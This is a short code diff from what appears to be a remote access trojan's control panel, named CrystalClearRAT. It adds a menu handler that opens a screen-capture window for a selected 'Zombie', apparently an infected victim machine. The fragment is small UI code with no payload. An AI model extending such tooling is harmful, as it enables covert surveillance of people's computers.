@@ -87,5 +87,10 @@ namespace CrystalClearRAT
         {
             return (((menuItem as MenuItem).Parent as ContextMenu).PlacementTarget as ListViewItem).Content as Zombie;
         }
+
+        private void SpyMonitorItem_Click(object sender, RoutedEventArgs e)
+        {
+            new ScreenCaptureWindow(GetZombieFromMenuItem(sender)).Show();
+        }
     }
 }
